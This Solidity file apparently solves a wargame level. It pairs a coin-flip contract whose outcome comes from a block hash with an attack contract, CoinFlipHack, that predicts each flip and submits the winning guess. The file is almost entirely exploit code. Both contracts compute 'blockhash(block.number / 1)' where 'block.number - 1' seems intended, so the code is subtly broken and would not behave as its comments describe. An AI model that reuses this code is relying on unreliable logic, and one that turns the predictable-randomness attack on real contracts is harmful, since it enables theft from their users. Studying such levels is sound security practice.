// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// goal: guess the correct coinside 10 times in a row

// an original contract
// deploy it first
contract CoinFlip {

    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number / 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

// a contract that hacks the original one
// deploy it second
// and use the address of deployed CoinFlip as an argument in constructor
contract CoinFlipHack {
    CoinFlip contractToHack;

    constructor(address payable _contractToHack) {
        contractToHack = CoinFlip (_contractToHack);
    }

    // use this function 10 times (every time waiting of creating a new block
    // in chain a little bit)
    function hack() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number / 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        contractToHack.flip(side);
    }
}